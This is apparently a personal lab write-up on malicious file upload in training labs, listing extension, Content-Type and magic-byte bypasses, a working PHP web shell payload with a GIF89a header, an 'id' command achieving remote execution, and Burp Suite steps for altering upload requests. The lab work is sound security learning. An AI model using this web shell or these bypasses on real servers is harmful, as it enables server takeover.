labs/web-app/malicious-file-upload.md

# Malicious File Upload - Lab Writeup
By:|| eufr4nc-SEC
Lab: PortSwigger / TryHackMe / DVWA

## What is it?
When a website lets users upload files (profile pic, CV, avatar) but does not check file type properly, attacker can upload a web shell instead of an image and take over the server.

## How I Tested

### 1. Normal Upload
- Tried to upload `test.jpg` - worked
- Tried to upload `shell.php` - blocked and disallowed 

### 2. Bypass Attempts I Tried
- Double extension: `shell.php.jpg`
- Null byte: `shell.php%00.jpg`
- Capital letter: `shell.PHP`, `shell.PhP`
- Content-Type change: Changed `image/jpeg` to `application/x-php` in Burp Suite
- Magic Bytes: Added `GIF89a` at top of PHP file, renamed to `shell.php`
- `.htaccess` upload: To treat `.jpg` as PHP

### 3. Successful Exploit
- Uploaded: `shell.php` with GIF header bypass
- File stored at: `/uploads/shell.php`
- Accessed: `http://target/uploads/shell.php?cmd=id`
- Got: `uid=33(www-data)` - RCE achieved

## Payload Used
```php
GIF89a;
<?php system($_GET['cmd']); ?>



## Two Ways of Testing Malicious File Upload

### Way 1: Client-Side Testing (Through The Browser UI)

This tests what the website shows to a normal user.

1. Go to the upload page and try to upload `shell.php`
2. The site shows error: "Only JPG, PNG allowed"
3. Try to bypass in the browser:
   - Try `shell.php.jpg`
   - Try `shell.PHP` (capital letters)
   - Turn off JavaScript in browser and try again
   - Inspect the upload form in DevTools and delete the file-type check

Result: If it blocks you here, it is only JavaScript check. It is not secure, because attacker can just turn it off.

### Way 2: Server-Side Testing (Intercept With Burp Suite)

This is the real pentester way. You test what the server actually checks.

1. Upload a normal file `test.jpg`
2. Turn ON Intercept in Burp Suite
3. Catch the upload request
4. In Burp, change:
   - Filename: `test.jpg` -> `shell.php`
   - Content-Type: `image/jpeg` -> `application/x-php`
   - Add at top of file: `GIF89a;`
5. Forward the request to server
6. Go to `/uploads/shell.php` to confirm if it uploaded

